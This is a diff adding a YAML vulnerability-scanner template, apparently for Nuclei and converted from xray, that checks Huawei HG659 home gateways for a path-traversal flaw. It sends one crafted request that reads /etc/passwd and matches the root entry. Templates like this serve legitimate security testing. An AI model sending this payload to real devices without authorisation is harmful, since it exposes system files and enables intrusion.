@@ -1,0 +1,25 @@
+id: poc-yaml-huawei-home-gateway-hg659-fileread
+
+info:
+  name: poc-yaml-huawei-home-gateway-hg659-fileread
+  author: B1anda0(https://github.com/B1anda0)
+  severity: medium
+  tags: xray-converted,ct-194257
+  reference:
+    - https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=4210
+
+http:
+  - raw:
+      - |
+        GET /lib///....//....//....//....//....//....//....//....//etc//passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "root:[x*]:0:0:"
